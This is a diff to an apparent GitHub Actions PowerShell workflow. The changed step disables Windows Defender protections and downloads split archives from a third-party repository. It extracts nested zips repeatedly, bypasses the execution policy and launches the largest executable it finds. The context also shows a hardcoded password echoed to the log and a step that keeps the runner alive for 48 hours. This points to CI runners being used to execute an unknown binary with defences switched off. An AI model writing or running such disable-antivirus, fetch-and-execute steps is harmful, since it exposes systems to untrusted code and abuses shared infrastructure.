@@ -38,25 +38,23 @@ jobs:
           Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
           Write-Host "==================================================" -ForegroundColor Green
 
-      - name: 4. Deploy and Execute Application
+      - name: 4. Aggressive Multi-Stage Extraction
         shell: powershell
         run: |
-          # 1. Define a Fixed Work Directory (Avoids User Profile issues)
-          $workDir = "C:\app_deploy"
-          $downloadDir = "$workDir\downloads"
-          
-          # Clean up previous attempts
+          # 1. Setup Workspace
+          $workDir = "C:\target_app"
           if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
-          New-Item -ItemType Directory -Path $downloadDir -Force | Out-Null
-          
-          # 2. Disable Security (Defender & SmartScreen)
+          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+          Set-Location -Path $workDir
+
+          # 2. Disable Security
           Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
           Set-MpPreference -DisableRealtimeMonitoring $true
           Set-MpPreference -DisableIOAVProtection $true
           Set-MpPreference -DisableBehaviorMonitoring $true
           Set-MpPreference -DisableScriptScanning $true
 
-          # 3. Download Split Zip Files (Direct Raw Links)
+          # 3. Download Initial Split Zip Files
           $filesToDownload = @(
             "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
             "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
@@ -64,42 +62,74 @@ jobs:
             "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
           )
 
+          Write-Host "Downloading initial files..." -ForegroundColor Yellow
           foreach ($url in $filesToDownload) {
               $fileName = Split-Path $url -Leaf
-              Write-Host "Downloading $fileName..." -ForegroundColor Yellow
-              Invoke-WebRequest -Uri $url -OutFile "$downloadDir\$fileName"
+              Invoke-WebRequest -Uri $url -OutFile "$workDir\$fileName"
           }
 
-          # 4. Robust Extraction using 7-Zip
-          # We use 7-Zip to handle the split volumes correctly.
-          Write-Host "Extracting archive using 7-Zip..." -ForegroundColor Cyan
-          & "C:\Program Files\7-Zip\7z.exe" x "$downloadDir\multinl_zip.zip" -o"$workDir" -y
+          # 4. Deep Extraction Loop
+          Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
+          
+          # We will loop to find and extract any ZIP file we encounter
+          $maxIterations = 5
+          $iteration = 0
+          $foundZip = $true
 
-          # 5. Find the Executable (Deep Search)
-          # Instead of hardcoding a path that might fail, we search the entire C:\app_deploy folder
-          Write-Host "Searching for application executable..." -ForegroundColor Cyan
+          while ($foundZip -and $iteration -lt $maxIterations) {
+              $iteration++
+              Write-Host "Iteration $iteration: Searching for ZIP files..." -ForegroundColor Yellow
+              
+              # Find all ZIP files in the work directory
+              $zips = Get-ChildItem -Path $workDir -Filter "*.zip" -Recurse
+              
+              if ($zips.Count -eq 0) {
+                  Write-Host "No more ZIP files found." -ForegroundColor Green
+                  $foundZip = $false
+              } else {
+                  foreach ($zip in $zips) {
+                      Write-Host "Extracting: $($zip.FullName)" -ForegroundColor Cyan
+                      
+                      # Use 7-Zip to extract to the same folder as the ZIP
+                      # We use -y for auto-yes and -o to specify output directory
+                      $targetFolder = $zip.DirectoryName
+                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
+                      
+                      # Small delay to allow filesystem to catch up
+                      Start-Sleep -Seconds 3
+                  }
+                  # After one round of extraction, we check again if new ZIPs appeared
+                  $foundZip = $true 
+              }
+          }
+
+          # 5. Search for the Executable (The Final Target)
+          Write-Host "Searching for the application (.exe)..." -ForegroundColor Cyan
           Start-Sleep -Seconds 5
           
-          $exeFile = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
+          # We look for ANY .exe in the entire work directory
+          $exeFiles = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue
 
-          if ($exeFile) {
+          if ($exeFiles.Count -gt 0) {
+              # Pick the largest EXE if multiple are found, as it's likely the main app
+              $exeFile = $exeFiles | Sort-Object Length -Descending | Select-Object -First 1
               $exePath = $exeFile.FullName
               $exeDir = Split-Path $exePath -Parent
-              Write-Host "SUCCESS: Found application at $exePath" -ForegroundColor Green
-              Write-Host "Launching from directory: $exeDir" -ForegroundColor Yellow
               
-              # 6. Final Execution
-              # We set the working directory to the EXE's folder so it finds its DLLs
+              Write-Host "SUCCESS! Found application: $exePath" -ForegroundColor Green
+              Write-Host "Launching from: $exeDir" -ForegroundColor Yellow
+              
+              # 6. Launch the Application
               Set-ExecutionPolicy Bypass -Scope Process -Force
               
-              # Launch the app in a way that doesn't block the workflow
+              # Launching with high priority and specific working directory
               Start-Process -FilePath $exePath -WorkingDirectory $exeDir -WindowStyle Normal
-              Write-Host "Application process started." -ForegroundColor Green
+              Write-Host "Application process triggered." -ForegroundColor Green
           } else {
-              Write-Host "CRITICAL ERROR: Could not find any .exe after extraction." -ForegroundColor Red
-              # Log everything to help debugging
-              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\debug_files.txt"
-              Write-Host "File structure logged to $workDir\debug_files.txt"
+              Write-Host "CRITICAL ERROR: No .exe found after $maxIterations extraction attempts." -ForegroundColor Red
+              Write-Host "Current Directory Structure:" -ForegroundColor Yellow
+              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\structure_log.txt"
+              Write-Host "Full structure logged to $workDir\structure_log.txt"
           }
 
       - name: 5. Keep Server Alive (48 Hours)
